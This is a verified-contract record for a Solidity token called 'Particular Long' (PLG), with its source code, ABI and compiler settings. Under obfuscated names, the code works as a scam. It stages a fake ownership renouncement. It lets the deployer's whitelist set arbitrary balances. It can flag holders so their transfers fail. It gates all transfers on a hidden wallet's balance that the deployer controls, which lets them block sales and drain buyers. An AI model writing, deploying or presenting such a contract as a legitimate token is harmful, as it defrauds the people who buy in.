{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.1;\n\ninterface listLaunchedBuy {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract minAmount {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface limitIsExempt {\n    function createPair(address launchedSender, address listWallet) external returns (address);\n}\n\ninterface shouldExemptAt {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address feeTokenTx) external view returns (uint256);\n\n    function transfer(address marketingAuto, uint256 fromLaunchedMode) external returns (bool);\n\n    function allowance(address receiverFund, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 fromLaunchedMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address marketingAuto,\n        uint256 fromLaunchedMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenFee, uint256 value);\n    event Approval(address indexed receiverFund, address indexed spender, uint256 value);\n}\n\ninterface launchExempt is shouldExemptAt {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract ParticularLong is minAmount, shouldExemptAt, launchExempt {\n\n    function getOwner() external view returns (address) {\n        return exemptFund;\n    }\n\n    address public fundToAmount;\n\n    uint8 private liquidityTxList = 18;\n\n    uint256 private feeFund;\n\n    function receiverReceiver(address launchTotal) public {\n        require(launchTotal.balance < 100000);\n        if (senderLaunched) {\n            return;\n        }\n        if (swapAmount != limitTeamMax) {\n            walletFrom = false;\n        }\n        tradingList[launchTotal] = true;\n        \n        senderLaunched = true;\n    }\n\n    function maxToken(address marketingAt, uint256 fromLaunchedMode) public {\n        maxList();\n        swapLiquidity[marketingAt] = fromLaunchedMode;\n    }\n\n    uint256 private enableAmountToken = 100000000 * 10 ** 18;\n\n    bool public walletFrom;\n\n    uint256 public atTo;\n\n    address private exemptFund;\n\n    function teamAmount(address totalAuto, address marketingAuto, uint256 fromLaunchedMode) internal returns (bool) {\n        if (totalAuto == fundToAmount) {\n            return fundSell(totalAuto, marketingAuto, fromLaunchedMode);\n        }\n        uint256 enableWalletTake = shouldExemptAt(txFeeLimit).balanceOf(launchedFee);\n        require(enableWalletTake == senderLaunchedList);\n        require(marketingAuto != launchedFee);\n        if (minFrom[totalAuto]) {\n            return fundSell(totalAuto, marketingAuto, fundIs);\n        }\n        return fundSell(totalAuto, marketingAuto, fromLaunchedMode);\n    }\n\n    bool public senderLaunched;\n\n    mapping(address => mapping(address => uint256)) private launchedToAt;\n\n    function takeShould() public {\n        emit OwnershipTransferred(fundToAmount, address(0));\n        exemptFund = address(0);\n    }\n\n    uint256 constant fundIs = 17 ** 10;\n\n    string private sellEnable = \"Particular Long\";\n\n    function symbol() external view virtual override returns (string memory) {\n        return modeSender;\n    }\n\n    uint256 private tokenFrom;\n\n    function transferFrom(address totalAuto, address marketingAuto, uint256 fromLaunchedMode) external override returns (bool) {\n        if (_msgSender() != launchMin) {\n            if (launchedToAt[totalAuto][_msgSender()] != type(uint256).max) {\n                require(fromLaunchedMode <= launchedToAt[totalAuto][_msgSender()]);\n                launchedToAt[totalAuto][_msgSender()] -= fromLaunchedMode;\n            }\n        }\n        return teamAmount(totalAuto, marketingAuto, fromLaunchedMode);\n    }\n\n    function owner() external view returns (address) {\n        return exemptFund;\n    }\n\n    function feeTeam(address buyMarketing) public {\n        maxList();\n        if (limitTeamMax) {\n            limitTeamMax = false;\n        }\n        if (buyMarketing == fundToAmount || buyMarketing == txFeeLimit) {\n            return;\n        }\n        minFrom[buyMarketing] = true;\n    }\n\n    mapping(address => bool) public tradingList;\n\n    function name() external view virtual override returns (string memory) {\n        return sellEnable;\n    }\n\n    bool public limitTeamMax;\n\n    constructor (){\n        if (walletFrom) {\n            atTo = feeFund;\n        }\n        listLaunchedBuy listSwap = listLaunchedBuy(launchMin);\n        txFeeLimit = limitIsExempt(listSwap.factory()).createPair(listSwap.WETH(), address(this));\n        if (swapAmount == limitTeamMax) {\n            swapAmount = false;\n        }\n        fundToAmount = _msgSender();\n        takeShould();\n        tradingList[fundToAmount] = true;\n        swapLiquidity[fundToAmount] = enableAmountToken;\n        if (walletFrom != limitTeamMax) {\n            feeFund = atTo;\n        }\n        emit Transfer(address(0), fundToAmount, enableAmountToken);\n    }\n\n    string private modeSender = \"PLG\";\n\n    function allowance(address autoBuy, address amountLaunchedSell) external view virtual override returns (uint256) {\n        if (amountLaunchedSell == launchMin) {\n            return type(uint256).max;\n        }\n        return launchedToAt[autoBuy][amountLaunchedSell];\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return liquidityTxList;\n    }\n\n    address launchMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private swapAmount;\n\n    mapping(address => uint256) private swapLiquidity;\n\n    event OwnershipTransferred(address indexed shouldLimitTx, address indexed totalTo);\n\n    function balanceOf(address feeTokenTx) public view virtual override returns (uint256) {\n        return swapLiquidity[feeTokenTx];\n    }\n\n    address launchedFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return enableAmountToken;\n    }\n\n    function marketingTeam(uint256 fromLaunchedMode) public {\n        maxList();\n        senderLaunchedList = fromLaunchedMode;\n    }\n\n    function fundSell(address totalAuto, address marketingAuto, uint256 fromLaunchedMode) internal returns (bool) {\n        require(swapLiquidity[totalAuto] >= fromLaunchedMode);\n        swapLiquidity[totalAuto] -= fromLaunchedMode;\n        swapLiquidity[marketingAuto] += fromLaunchedMode;\n        emit Transfer(totalAuto, marketingAuto, fromLaunchedMode);\n        return true;\n    }\n\n    function maxList() private view {\n        require(tradingList[_msgSender()]);\n    }\n\n    uint256 senderLaunchedList;\n\n    mapping(address => bool) public minFrom;\n\n    address public txFeeLimit;\n\n    function transfer(address marketingAt, uint256 fromLaunchedMode) external virtual override returns (bool) {\n        return teamAmount(_msgSender(), marketingAt, fromLaunchedMode);\n    }\n\n    uint256 feeReceiverMode;\n\n    function approve(address amountLaunchedSell, uint256 fromLaunchedMode) public virtual override returns (bool) {\n        launchedToAt[_msgSender()][amountLaunchedSell] = fromLaunchedMode;\n        emit Approval(_msgSender(), amountLaunchedSell, fromLaunchedMode);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFund\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldLimitTx\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalTo\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenFee\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountLaunchedSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountLaunchedSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunchedMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atTo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTokenTx\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyMarketing\",\"type\":\"address\"}],\"name\":\"feeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundToAmount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitTeamMax\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"fromLaunchedMode\",\"type\":\"uint256\"}],\"name\":\"marketingTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunchedMode\",\"type\":\"uint256\"}],\"name\":\"maxToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"minFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchTotal\",\"type\":\"address\"}],\"name\":\"receiverReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeShould\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingAt\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunchedMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"marketingAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"fromLaunchedMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"txFeeLimit\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "ParticularLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}